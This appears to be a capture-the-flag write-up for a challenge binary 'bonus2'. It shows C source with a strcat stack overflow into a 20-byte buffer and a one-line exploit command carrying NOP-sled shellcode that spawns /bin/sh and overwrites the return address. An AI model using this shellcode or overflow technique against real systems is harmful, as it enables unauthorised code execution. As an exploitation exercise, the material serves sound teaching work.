# bonus2

```c
#include <stdio.h>
#include <memory.h>
#include <string.h>
#include <stdlib.h>

int language = 0;

const char *NL = "Hyvää päivää ";
const char *FL = "Goedemiddag! ";
const char *DFT = "Hello ";


void greetuser(char *ptr)
{
    char buffer[20];

    switch (language) {
        case 1:
            strcpy(buffer, NL);
            break;
        case 2:
            strcpy(buffer, FL);
            break;
        default:
            strcpy(buffer, DFT);
            break;
    }
    strcat(buffer, ptr);
    puts(buffer);
}

int main(int argc, char **argv)
{
    char buffer1[76];
    char buffer2[76];
    char *lang;

    if (argc != 3)
    {
        return 1;
    }
    memset(buffer2, 0, sizeof(buffer2));
    strncpy(buffer2, argv[1], 40);
    strncpy(&buffer2[40], argv[2], 32);
    lang = getenv("LANG");
    if (lang)
    {
        if (!memcmp(lang, "fi", 2u))
        {
            language = 1;
        }
        else if (!memcmp(lang, "nl", 2u))
        {
            language = 2;
        }
    }
    memcpy(buffer1, buffer2, sizeof(buffer1));
    greetuser(buffer1);
    return 0;
}

There is a buffer overflow vulnerability in the `greetuser` function. `strcat` uses a buffer with only 20 bytes as destination, taking as source a buffer than can be bigger.

```
LANG=nl ./bonus2 $(python -c 'print("\x90"*17 + "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\x89\xC2\xB0\x0B\xCD\x80")') $(python -c 'print("b"*23 + "\x80\xF6\xFF\xBF")')
```